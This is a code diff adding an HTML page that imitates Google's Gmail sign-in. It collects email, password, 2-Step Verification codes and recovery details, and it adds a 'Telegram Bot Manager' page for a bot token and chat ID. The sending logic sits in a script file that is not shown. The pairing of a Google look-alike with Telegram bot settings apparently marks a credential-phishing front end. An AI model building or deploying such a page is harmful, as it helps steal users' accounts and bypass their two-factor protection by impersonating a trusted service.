@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <link rel="stylesheet" href="src/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body class="light-theme">
+    <!-- Theme Toggle -->
+    <div class="theme-toggle">
+        <button id="themeToggle" class="theme-btn" aria-label="Toggle dark mode">
+            <span class="theme-icon">🌙</span>
+        </button>
+    </div>
+
+    <div class="container">
+        <!-- Main Login Page -->
+        <div class="page" id="loginPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" class="google-logo">
+                </div>
+                <div class="card-header">
+                    <h1>Sign in</h1>
+                    <p>Use your Google Account</p>
+                </div>
+                <form class="login-form" id="loginForm">
+                    <div class="input-group">
+                        <label for="email" class="sr-only">Email</label>
+                        <input type="email" id="email" name="email" placeholder="Email or phone" required autocomplete="username">
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#" class="forgot-link" id="forgotEmailLink">Forgot email?</a>
+                    </div>
+                    <div class="form-info">
+                        <p>Not your computer? Use Guest mode to sign in privately.</p>
+                        <a href="#" class="learn-more">Learn more</a>
+                    </div>
+                    <div class="form-actions">
+                        <a href="#" class="create-account" id="createAccountLink">Create account</a>
+                        <button type="submit" class="next-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Password Page -->
+        <div class="page hidden" id="passwordPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" class="google-logo">
+                </div>
+                <div class="card-header">
+                    <h1>Welcome</h1>
+                    <div class="user-info">
+                        <div class="user-avatar">
+                            <span class="avatar-placeholder" id="userAvatar">👤</span>
+                        </div>
+                        <div class="user-email" id="userEmail"></div>
+                        <a href="#" class="change-account" id="changeAccount">Change account</a>
+                    </div>
+                </div>
+                <form class="login-form" id="passwordForm">
+                    <div class="input-group">
+                        <label for="password" class="sr-only">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                        <button type="button" class="show-password" id="showPassword" aria-label="Show password">
+                            <span class="eye-icon">👁️</span>
+                        </button>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="#" class="forgot-link" id="forgotPasswordLink">Forgot password?</a>
+                    </div>
+                    <div class="form-actions">
+                        <button type="button" class="back-btn" id="backToEmail">Back</button>
+                        <button type="submit" class="next-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Create Account Page -->
+        <div class="page hidden" id="createAccountPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" class="google-logo">
+                </div>
+                <div class="card-header">
+                    <h1>Create your Google Account</h1>
+                    <p>Enter your name</p>
+                </div>
+                <form class="login-form" id="createAccountForm">
+                    <div class="name-inputs">
+                        <div class="input-group half">
+                            <label for="firstName" class="sr-only">First name</label>
+                            <input type="text" id="firstName" name="firstName" placeholder="First name" required>
+                        </div>
+                        <div class="input-group half">
+                            <label for="lastName" class="sr-only">Last name</label>
+                            <input type="text" id="lastName" name="lastName" placeholder="Last name" required>
+                        </div>
+                    </div>
+                    <div class="input-group">
+                        <label for="newEmail" class="sr-only">Email</label>
+                        <input type="email" id="newEmail" name="newEmail" placeholder="Choose your email address" required>
+                        <div class="email-suggestion">You can use letters, numbers & periods</div>
+                    </div>
+                    <div class="password-inputs">
+                        <div class="input-group half">
+                            <label for="newPassword" class="sr-only">Password</label>
+                            <input type="password" id="newPassword" name="newPassword" placeholder="Password" required>
+                        </div>
+                        <div class="input-group half">
+                            <label for="confirmPassword" class="sr-only">Confirm password</label>
+                            <input type="password" id="confirmPassword" name="confirmPassword" placeholder="Confirm" required>
+                        </div>
+                    </div>
+                    <div class="password-info">
+                        <p>Use 8 or more characters with a mix of letters, numbers & symbols</p>
+                    </div>
+                    <div class="form-actions">
+                        <a href="#" class="sign-in-instead" id="signInInstead">Sign in instead</a>
+                        <button type="submit" class="next-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Password Recovery Page -->
+        <div class="page hidden" id="recoveryPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" class="google-logo">
+                </div>
+                <div class="card-header">
+                    <h1>Recover your email</h1>
+                    <p>Enter your recovery phone number or email</p>
+                </div>
+                <form class="login-form" id="recoveryForm">
+                    <div class="input-group">
+                        <label for="recoveryInfo" class="sr-only">Recovery information</label>
+                        <input type="text" id="recoveryInfo" name="recoveryInfo" placeholder="Enter recovery email or phone number" required>
+                    </div>
+                    <div class="form-info">
+                        <p>We'll send a verification code to this email or phone number.</p>
+                    </div>
+                    <div class="form-actions">
+                        <button type="button" class="back-btn" id="backToLogin">Back</button>
+                        <button type="submit" class="next-btn">Send code</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Two-Factor Authentication Page -->
+        <div class="page hidden" id="twoFactorPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" class="google-logo">
+                </div>
+                <div class="card-header">
+                    <h1>2-Step Verification</h1>
+                    <div class="user-info">
+                        <div class="user-email" id="twoFactorEmail"></div>
+                    </div>
+                    <p>Check your phone for a verification code</p>
+                </div>
+                <form class="login-form" id="twoFactorForm">
+                    <div class="input-group">
+                        <label for="verificationCode" class="sr-only">Verification code</label>
+                        <input type="text" id="verificationCode" name="verificationCode" placeholder="Enter 6-digit code" required maxlength="6" pattern="[0-9]{6}">
+                    </div>
+                    <div class="form-info">
+                        <p>Didn't get the code? <a href="#" class="resend-code">Resend code</a></p>
+                    </div>
+                    <div class="form-actions">
+                        <button type="button" class="back-btn" id="backToPassword">Back</button>
+                        <button type="submit" class="next-btn">Verify</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- Success Page -->
+        <div class="page hidden" id="successPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <img src="https://developers.google.com/identity/images/g-logo.png" alt="Google" class="google-logo">
+                </div>
+                <div class="card-header">
+                    <h1>Welcome to Gmail</h1>
+                    <div class="success-icon">✅</div>
+                    <p>You have successfully signed in!</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Telegram Bot Manager Page -->
+        <div class="page hidden" id="telegramBotPage">
+            <div class="login-card">
+                <div class="logo-container">
+                    <div class="telegram-logo">🤖</div>
+                    <h2>Telegram Bot Manager</h2>
+                </div>
+                <div class="card-header">
+                    <h1>Manage Your Telegram Bot</h1>
+                    <p>Configure and test your Telegram bot settings</p>
+                </div>
+
+                <!-- Bot Token Section -->
+                <div class="bot-section">
+                    <h3>Bot Token Configuration</h3>
+                    <form class="bot-form" id="botTokenForm">
+                        <div class="input-group">
+                            <label for="botToken" class="input-label">Bot Token</label>
+                            <input type="password" id="botToken" name="botToken" placeholder="Enter your bot token (e.g., 123456789:ABCDEF...)" required>
+                            <button type="button" class="show-password" id="showBotToken" aria-label="Show bot token">
+                                <span class="eye-icon">👁️</span>
+                            </button>
+                            <div class="input-help">Get your bot token from @BotFather on Telegram</div>
+                        </div>
+                        <div class="form-actions">
+                            <button type="button" class="secondary-btn" id="validateToken">Validate Token</button>
+                            <button type="submit" class="next-btn">Save Token</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Bot Information Display -->
+                <div class="bot-section hidden" id="botInfoSection">
+                    <h3>Bot Information</h3>
+                    <div class="bot-info-card">
+                        <div class="bot-avatar" id="botAvatar">🤖</div>
+                        <div class="bot-details">
+                            <div class="bot-name" id="botName">-</div>
+                            <div class="bot-username" id="botUsername">-</div>
+                            <div class="bot-id" id="botId">ID: -</div>
+                        </div>
+                        <div class="bot-status" id="botStatus">
+                            <span class="status-indicator"></span>
+                            <span class="status-text">Unknown</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Chat ID Management -->
+                <div class="bot-section">
+                    <h3>Chat ID Management</h3>
+                    <form class="bot-form" id="chatIdForm">
+                        <div class="input-group">
+                            <label for="chatId" class="input-label">Chat ID</label>
+                            <input type="text" id="chatId" name="chatId" placeholder="Enter chat ID (e.g., -1001234567890 or 123456789)" required>
+                            <div class="input-help">Use your user ID or group chat ID</div>
+                        </div>
+                        <div class="input-group">
+                            <label for="testMessage" class="input-label">Test Message</label>
+                            <textarea id="testMessage" name="testMessage" placeholder="Enter a test message to send..." rows="3"></textarea>
+                        </div>
+                        <div class="form-actions">
+                            <button type="button" class="secondary-btn" id="getChatInfo">Get Chat Info</button>
+                            <button type="submit" class="next-btn">Send Test Message</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Chat Information Display -->
+                <div class="bot-section hidden" id="chatInfoSection">
+                    <h3>Chat Information</h3>
+                    <div class="chat-info-card">
+                        <div class="chat-details">
+                            <div class="chat-title" id="chatTitle">-</div>
+                            <div class="chat-type" id="chatType">-</div>
+                            <div class="chat-id-display" id="chatIdDisplay">ID: -</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Message Log -->
+                <div class="bot-section">
+                    <h3>Activity Log</h3>
+                    <div class="message-log" id="messageLog">
+                        <div class="log-entry info">
+                            <span class="log-time">Ready</span>
+                            <span class="log-message">Enter your bot token to get started</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Navigation -->
+                <div class="form-actions">
+                    <button type="button" class="back-btn" id="backToSuccess">Back to Dashboard</button>
+                    <button type="button" class="secondary-btn" id="clearBotData">Clear All Data</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <select class="language-select">
+                <option value="en">English (United States)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay hidden" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Signing you in...</p>
+    </div>
+
+    <script type="module" src="/src/main.ts"></script>
+</body>
+</html>
